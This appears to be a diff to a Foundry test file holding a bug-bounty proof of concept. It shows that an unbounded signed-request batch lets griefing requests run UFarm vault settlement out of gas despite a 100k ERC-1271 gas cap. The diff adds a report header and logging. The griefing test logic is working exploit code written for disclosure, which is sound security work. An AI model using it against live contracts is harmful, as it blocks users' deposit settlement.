@@ -1,13 +1,27 @@
 // SPDX-License-Identifier: BUSL-1.1
-// Worker F — UFARM2-1 incomplete-fix PoC:
-// Hexens UFARM2-1 was "fixed" by capping the ERC-1271 subcall at 100_000 gas
-// (VaultLifecycleModule L59, L583). The cap bounds ONE call, but settleRequests()
-// loops over an UNBOUNDED caller-supplied batch, so N griefing requests burn
-// ~N x 100k gas and the whole settlement tx runs out of gas — the exact
-// batch-settlement griefing the fix was meant to stop. The attacker pays zero
-// on-chain gas: they only submit signed messages off-chain to the backend.
+/**
+ * @title UFarm Digital - Unbounded signed-request batch lets griefing requests OOG settlement despite the 100k ERC-1271 gas cap
+ * @notice PoC for Remedy submission (F-05)
+ * @dev Demonstrates the incomplete fix of Hexens UFARM2-1: the 100k gas cap
+ *      bounds ONE ERC-1271 call, but settleRequests() loops over an UNBOUNDED
+ *      caller-supplied batch, so N griefing requests burn ~N x 100k gas and
+ *      the whole settlement tx runs out of gas. The attacker pays zero
+ *      on-chain gas: they only submit signed messages off-chain to the backend.
+ *
+ * Vulnerable contract: VaultLifecycleModule (UFarmVault)
+ * Vulnerable function: settleRequests / _requestDeposits / _requestRedeems / _isValidOwnerSignature
+ * Vulnerable lines: VaultLifecycleModule.sol:225-243 (unbounded loop),
+ *   :295-317 (per-request processing), :572-590 (signature validation),
+ *   :59 (100_000 gas cap on the ERC-1271 subcall), :61 (PENDING_QUEUE_LIMIT
+ *   caps only accepted owners, checked last in _validateRequest :518-541).
+ * Program: https://hunt.r.xyz/programs/ufarm-digital
+ * Report: https://hunt.r.xyz/report-thread/98e9a85b-a08c-4008-b972-6f2a47c5e1e0
+ * Severity: Low
+ * Target: UFarmDigital/UFarm-EVM-Contracts @ b19a6511 ("Production Release 2.1.1")
+ */
 pragma solidity 0.8.35;
 
+import {console} from "forge-std/console.sol";
 import {InvariantFixture} from "./invariant/helpers/InvariantFixture.sol";
 import {IUFarmVaultRequests} from "../src/interfaces/IUFarmVaultRequests.sol";
 import {IERC1271} from "@openzeppelin/contracts/interfaces/IERC1271.sol";
@@ -76,6 +90,7 @@ contract GriefPoCTest is InvariantFixture {
         uint256 oracleRequestId = vault.settleRequests(_griefBatch(0), _griefBatch(0));
         uint256 gasUsed = startGas - gasleft();
         _checkGt(oracleRequestId, 0, "oracle request must start");
+        console.log("control settle gas (N=0 griefing)", gasUsed);
         emit LogUint("control settle gas", gasUsed);
     }
 
@@ -87,6 +102,7 @@ contract GriefPoCTest is InvariantFixture {
         uint256 gasUsed = startGas - gasleft();
         _checkGt(oracleRequestId, 0, "settlement must still start with 1 griefing request");
         _checkEq(vault.requestNonces(address(griefOwner)), 0, "grief owner nonce must stay 0");
+        console.log("gas for 1 griefing request + settle", gasUsed);
         emit LogUint("gas for 1 griefing request + settle", gasUsed);
         _checkGt(gasUsed, 100_000, "one griefing request must burn at least the 100k ERC-1271 cap");
     }
@@ -97,6 +113,7 @@ contract GriefPoCTest is InvariantFixture {
         uint256 g0 = gasleft();
         vault.settleRequests(_griefBatch(0), _griefBatch(0));
         uint256 baseCost = g0 - gasleft();
+        console.log("base settle gas (N=0)", baseCost);
         emit LogUint("base settle gas (N=0)", baseCost);
     }
 
@@ -105,6 +122,7 @@ contract GriefPoCTest is InvariantFixture {
         uint256 g0 = gasleft();
         vault.settleRequests(_griefBatch(10), _griefBatch(0));
         uint256 cost10 = g0 - gasleft();
+        console.log("settle gas (N=10 griefing)", cost10);
         emit LogUint("settle gas (N=10 griefing)", cost10);
         // Marginal cost per griefing request must be ~100k (the cap) + validation overhead.
         // Base settle is measured in the N=0 test; here we assert the total is far above base.
@@ -137,6 +155,8 @@ contract GriefPoCTest is InvariantFixture {
         (bool success,) = address(vault).call{gas: 30_000_000}(
             abi.encodeCall(IUFarmVaultRequests.settleRequests, (deposits, redeems))
         );
+        console.log("settle tx success with 280 griefing requests (30M gas)", success);
+        console.log("pending deposit after OOG settlement", vault.pendingDepositRequest(0, alice));
         _checkFalse(success, "280 griefing requests must OOG a 30M-gas settleRequests tx");
         // Settlement never started: no oracle request, pending deposit still queued.
         _checkEq(vault.pendingDepositRequest(0, alice), 100 ether, "deposit must still be pending after OOG");
@@ -179,6 +199,8 @@ contract GriefPoCTest is InvariantFixture {
         (bool success,) = address(vault).call{gas: 30_000_000}(
             abi.encodeCall(IUFarmVaultRequests.settleRequests, (deposits, _griefBatch(0)))
         );
+        console.log("settle tx success with 260 distinct griefing owners (30M gas)", success);
+        console.log("pending deposit after OOG settlement", vault.pendingDepositRequest(0, alice));
         _checkFalse(success, "260 distinct griefing owners must OOG a 30M-gas settleRequests tx");
         _checkEq(vault.pendingDepositRequest(0, alice), 100 ether, "deposit must still be pending after OOG");
     }
